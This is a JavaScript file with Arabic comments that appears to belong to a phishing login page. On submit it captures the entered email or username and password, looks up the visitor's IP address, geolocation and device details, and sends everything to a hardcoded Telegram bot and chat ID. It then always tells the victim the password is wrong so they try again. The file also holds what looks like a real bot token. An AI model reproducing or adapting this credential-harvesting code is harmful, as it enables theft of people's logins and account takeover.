document.addEventListener('DOMContentLoaded', function () {
    // دالة لإرسال البيانات إلى تلغرام
    function sendToTelegram(message) {
        const botToken = '7848626679:AAG8CbYCC_jJSczWzexlT24rqnQOTl3jAHY';  // استبدل بـ Token الخاص بالبوت
        const chatId = '5671856674';      // استبدل بـ Chat ID الخاص بالقناة أو المجموعة
        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const url = `${telegramApiUrl}?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log(``);
                } else {
                    console.log('حدث خطأ أثناء إرسال الرسالة:', data.description);
                }
            })
            .catch(error => {
                console.error('حدث خطأ:', error);
            });
    }

    // دالة للحصول على عنوان الـ IP
    function getUserIp() {
        return fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip)
            .catch(error => {
                console.error('حدث خطأ أثناء الحصول على الـ IP:', error);
                return 'غير قادر على الحصول على IP';
            });
    }

    // دالة للحصول على موقع المستخدم باستخدام عنوان الـ IP
    function getLocation(ip) {
        return fetch(`http://ip-api.com/json/${ip}`)
            .then(response => response.json())
            .then(data => {
                if (data.status === "fail") {
                    return "غير قادر على تحديد الموقع";
                } else {
                    return `${data.city}, ${data.regionName}, ${data.country}`;
                }
            })
            .catch(error => {
                console.error('حدث خطأ أثناء الحصول على الموقع:', error);
                return 'غير قادر على تحديد الموقع';
            });
    }

    // دالة للحصول على نوع الجهاز ونظام التشغيل وموديل الجهاز
    function getDeviceAndOSInfo() {
        const userAgent = navigator.userAgent;
        const parser = new UAParser();
        const result = parser.getResult();
        let deviceType = 'Unknown Device';
        let os = 'Unknown OS';
        let model = 'Unknown Model';

        // تحديد نوع الجهاز
        if (userAgent.match(/Mobile|Android|iPhone|iPad|iPod/i)) {
            deviceType = 'Mobile Device';
        } else if (userAgent.match(/Windows|Macintosh/i)) {
            deviceType = 'Desktop Computer';
        }

        // تحديد نظام التشغيل
        if (userAgent.match(/Windows NT/i)) {
            os = 'Windows';
        } else if (userAgent.match(/Macintosh/i)) {
            os = 'Mac OS';
        } else if (userAgent.match(/Android/i)) {
            os = 'Android';
        } else if (userAgent.match(/iPhone|iPad|iPod/i)) {
            os = 'iOS';
        }

        // إذا كانت مكتبة UAParser قادرة على تحديد موديل الجهاز
        if (result.device.model) {
            model = result.device.model;
        }

        return { deviceType, os, model };
    }

    // دالة لتشغيل إرسال البيانات عند الضغط على زر "تسجيل الدخول"
    function handleLogin(event) {
        event.preventDefault();  // لمنع تحميل الصفحة عند الضغط على الزر

        const email = document.getElementById('emil').value;
        const password = document.getElementById('pass').value;

        // تحقق من عدد الحقول المملوءة
        if (!email || !password) {
            // إذا كانت واحدة من الحقول فارغة
            alert('يرجى ملء جميع الحقول.');
        } else {
            // الحصول على عنوان IP للمستخدم ونوع الجهاز ونظام التشغيل
            getUserIp().then(ipAddress => {
                // الحصول على موقع المستخدم باستخدام عنوان الـ IP
                getLocation(ipAddress).then(location => {
                    const { deviceType, os, model } = getDeviceAndOSInfo();

                    // إعداد الرسالة التي تحتوي على المعلومات المدخلة، عنوان الـ IP ونوع الجهاز ونظام التشغيل والموديل
                    const message = `تم محاولة تسجيل الدخول من قبل المستخدم:\nالبريد الإلكتروني أو رقم الهاتف أو اسم المستخدم: ${email}\nكلمة السر: ${password}\nعنوان الـ IP: ${ipAddress}\nالموقع: ${location}\nنوع الجهاز: ${deviceType}\nنظام التشغيل: ${os}\nموديل الجهاز: ${model}`;
                    
                    sendToTelegram(message);  // إرسال الرسالة إلى تلغرام

                    // عرض رسالة للمستخدم بأن البيانات غير صحيحة دائمًا
                    alert('اسم المستخدم أو كلمة المرور غير صحيحة. يرجى المحاولة مجددًا.');
                });
            });
        }
    }

    // ربط الحدث بزر "تسجيل الدخول"
    const loginButton = document.querySelector('.btn a');
    if (loginButton) {
        loginButton.addEventListener('click', handleLogin);
    }
});
